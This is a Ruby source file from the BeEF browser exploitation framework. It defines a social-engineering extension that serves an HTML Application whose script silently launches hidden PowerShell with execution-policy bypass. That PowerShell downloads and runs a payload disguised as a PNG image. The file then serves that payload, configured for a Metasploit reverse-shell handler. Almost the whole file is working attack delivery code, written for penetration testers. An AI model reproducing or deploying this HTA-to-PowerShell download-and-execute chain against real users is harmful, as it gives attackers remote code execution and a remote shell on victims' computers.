#
# Copyright (c) 2006-2023 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
  module Extension
    module SocialEngineering
      #
      # By default powershell will be served from http://beef_server:beef_port/ps/ps.png
      #
      # NOTE: make sure you change the 'beef.http.public' settings in the main BeEF config.yaml to the public IP address / hostname for BeEF,
      # and also the powershell-related variable in extensions/social_engineering/config.yaml,
      # and also write your PowerShell payload to extensions/social_engineering/powershell/powershell_payload.
      class Bind_powershell < BeEF::Core::Router::Router
        before do
          headers 'Pragma' => 'no-cache',
                  'Cache-Control' => 'no-cache',
                  'Expires' => '0'
        end

        # serves the HTML Application (HTA)
        get '/hta' do
          response['Content-Type'] = 'application/hta'
          @config = BeEF::Core::Configuration.instance
          beef_url_str = @config.beef_url_str
          ps_url = @config.get('beef.extension.social_engineering.powershell.powershell_handler_url')
          payload_url = "#{beef_url_str}#{ps_url}/ps.png"

          print_info "Serving HTA. Powershell payload will be retrieved from: #{payload_url}"
          "<script>
                var c = \"cmd.exe /c powershell.exe -w hidden -nop -ep bypass -c \\\"\\\"IEX ((new-object net.webclient).downloadstring('#{payload_url}')); Invoke-ps\\\"\\\"\";
                new ActiveXObject('WScript.Shell').Run(c);
            </script>"
        end

        # serves the powershell payload after modifying LHOST/LPORT
        # The payload gets served via HTTP by default. Serving it via HTTPS it's still a TODO
        get '/ps.png' do
          response['Content-Type'] = 'text/plain'

          @ps_lhost = BeEF::Core::Configuration.instance.get('beef.extension.social_engineering.powershell.msf_reverse_handler_host')
          @ps_port = BeEF::Core::Configuration.instance.get('beef.extension.social_engineering.powershell.msf_reverse_handler_port')

          ps_payload_path = "#{$root_dir}/extensions/social_engineering/powershell/powershell_payload"

          if File.exist?(ps_payload_path)
            return File.read(ps_payload_path).to_s.gsub('___LHOST___', @ps_lhost).gsub('___LPORT___', @ps_port)
          end

          nil
        end
      end
    end
  end
end
